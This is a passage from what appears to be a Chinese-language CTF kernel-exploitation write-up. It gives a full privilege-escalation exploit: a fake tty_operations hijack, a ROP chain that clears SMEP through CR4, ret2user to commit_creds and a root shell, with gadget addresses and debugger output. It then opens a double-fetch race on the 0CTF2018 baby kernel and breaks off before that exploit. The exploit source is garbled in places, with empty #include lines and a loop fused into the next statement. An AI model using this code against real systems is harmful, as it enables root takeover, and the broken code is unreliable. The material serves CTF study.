
```
struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                        struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                      const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        unsigned int (*write_room)(struct tty_struct *tty);
        unsigned int (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                    unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                             unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                        unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*get_icount)(struct tty_struct *tty,
                                struct serial_icounter_struct *icount);
        int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
        int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
        int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

这里我们执行到ROP链后写`cr4`寄存器为0x6f0来绕过SMEP，然后打ret2user，但这里每次提权成功后返回userland的时候到`swapgs`后的`pop rbp`总会报错

```
   0xffffffff81063694       swapgs 

 ► 0xffffffff81063697       pop    rbp

   0xffffffff81063698       ret    

    ↓

   0xffffffff814e35ef     iretq  

   0xffffffff814e35f1     ret    

   0xffffffff814e35f2     dec    dword ptr [rax - 0x75]

   0xffffffff814e35f5     push   rbp

   0xffffffff814e35f6     test   al, init_module+36            

   0xffffffff814e35f8     mov    esi, dword ptr [rbp - 0x50]

   0xffffffff814e35fb     mov    rdi, rbx

   0xffffffff814e35fe     call   audit_log_n_hex            

──────────────────────────────────────────────────────────────────────────────────────────────────

00:0000│ rsp 0x7ffeb93ba830 ◂— 0x0

01:0008│     0x7ffeb93ba838 —▸ 0xffffffff814e35ef (tty_audit_log+239) ◂— iretq  

02:0010│     0x7ffeb93ba840 —▸ 0x402001 ◂— endbr64 

03:0018│     0x7ffeb93ba848 ◂— 0x33 /* '3' */

04:0020│     0x7ffeb93ba850 ◂— 0x246

05:0028│     0x7ffeb93ba858 —▸ 0x7ffeb93ba7d0 —▸ 0xffff880005fc7758 ◂— 0xcc

06:0030│     0x7ffeb93ba860 ◂— 0x2b /* '+' */

07:0038│     0x7ffeb93ba868 ◂— 0x0

──────────────────────────────────────────────────────────────────────────────────────────────────

 ► f 0 0xffffffff81063697 native_swapgs+7

──────────────────────────────────────────────────────────────────────────────────────────────────

pwndbg> i all-registers cr3

cr3            0x5fe2000           [ PDBR=2 PCID=0 ]
```

据推测这里因该确实是`KPTI`开启的情况，但为什么加了`nopti`还是有这个存在呢，难以理解，但是本题利用的过程算是摸清楚了

exp如下:

```
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define __USE_GNU
#include 

size_t prepare_kernel_cred = 0xffffffff810a1810;
size_t commit_creds = 0xffffffff810a1420;
size_t init_cred = 0xffffffff82a6b700;
const size_t pop_rdi = 0xffffffff810d238d;
const size_t pop_rsi = 0xffffffff811dd9ae;
const size_t pop_rdx = 0xffffffff81440b72;
const size_t mov_rc4_rdi_pop_rbp = 0xffffffff81004d80;
const size_t swapgs_pop_rbp = 0xffffffff81063694;
const size_t iretq = 0xffffffff8181a797;
const size_t mov_rsp_rax_ret = 0xffffffff8181bfc5;
const size_t pop_rax_ret = 0xffffffff8100ce6e;
const size_t mov_rdi_rax_pop2 = 0xffffffff8133b32e;

#define PRINT_ADDR(str, x) printf("\033[0m\033[1;34m[+]%s \033[0m:%p\n", str, x)

void info_log(char*);
void error_log(char*);
void saveStatus();
void get_shell();
void getRootPrivilige();
void bind_cpu(int);

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  info_log("Status has been saved Successfully!");
}

void info_log(char* str){
  printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);
}

void error_log(char* str){
  printf("\033[0m\033[1;31m%s\033[0m\n",str);
  exit(1);
}

void get_shell(){
  system("/bin/sh");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void main(){
  saveStatus();
  int i; 

  size_t buff[0x10] = {0};
  size_t rop[0x100] = {0};
  size_t fake_tty_operations[0x30] = {0};
  PRINT_ADDR("fake_tty_operations", fake_tty_operations);
  size_t tty_struct_padding[0x10] = {0};

  int p = 0;
  rop[p++] = pop_rdi;
  rop[p++] = 0x6f0;
  rop[p++] = mov_rc4_rdi_pop_rbp;
  rop[p++] =((size_t)&rop&(~0xfff));
  rop[p++] = getRootPrivilige;
  rop[p++] = swapgs_pop_rbp;
  rop[p++] = ((size_t)&rop&(~0xfff));
  rop[p++] = iretq;
  rop[p++] = get_shell;
  rop[p++] = user_cs;
  rop[p++] = user_rflags;
  rop[p++] = user_sp;
  rop[p++] = user_cs;

  for(i = 0; i ops
  read(fd2, tty_struct_padding, 0x30);
  tty_struct_padding[3] = fake_tty_operations;
  write(fd2, tty_struct_padding, 0x30);
  write(fd3, buff, 0x10);

}
```

## 二、Race Condition条件竞争

大伙应该都听过这个名次，也就是利用了如今计算机领域常见的同步和互斥导致问题来进行攻击

## 3. 例题：0CTF2018 Final - baby kernel

整个模块就实现了`ioctl`，如下：

```
__int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  int i; // [rsp-5Ch] [rbp-5Ch]
  __int64 v5; // [rsp-58h] [rbp-58h]
  _fentry__(a1, a2);
  v5 = v2;
  if ( a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    return 0LL;
  }
  else if ( a2 == 0x1337
         && !_chk_range_not_ok(v2, 16LL, *(__readgsqword(¤t_task) + 0x1358))// check1:检查传递结构体的范围是否小于0x7ffff...
         && !_chk_range_not_ok(*v5, *(v5 + 8), *(__readgsqword(¤t_task) + 0x1358))// check2:检查结构体内容的范围是否小于0x7ffff...
         && *(v5 + 8) == strlen(flag) )         // check3:检查长度是否等于flag
  {
    for ( i = 0; i 
```

这里可以看到他是首先给出了`flag`的地址，然后再与我们传入的数据结构进行比较，其中有三个check

- 检查我们的传入数据结构是否位于用户态（这里的`&current_task`+0x1358的值是可以通过动调知道）
- 检查我们传入数据结构指向的块是否位于用户态
- 检查指向块的长度是否位于用户态

检查完毕后再来查看我们传入的块里面的数据是否等于`flag`值，如果等于则打印在内核输出当中

下面就是本次讲解的例题手法

### 4.1 double fetch

这里的doube fetch就是两次取的意思，我们可以知道，在内核检测数据的过程中，以及到达开始比较的过程当中，这一段缝隙对于人来说可能是十分短且可以忽略的地方，而对于程序来说那就不是这样了，我们可以充分利用这段间隙，在该地址通过检测的情况下再立刻修改他指向的值，这样就可以绕过检测，这里给出a3师傅的图

![](https://i.loli.net/2021/09/08/GOSsNPkuMZHlUmT.png)

这里值得注意的一点就是再我们使用`pthread`函数簇的时候，记得编译选项加上`-lpthread`

我们的exp如下：
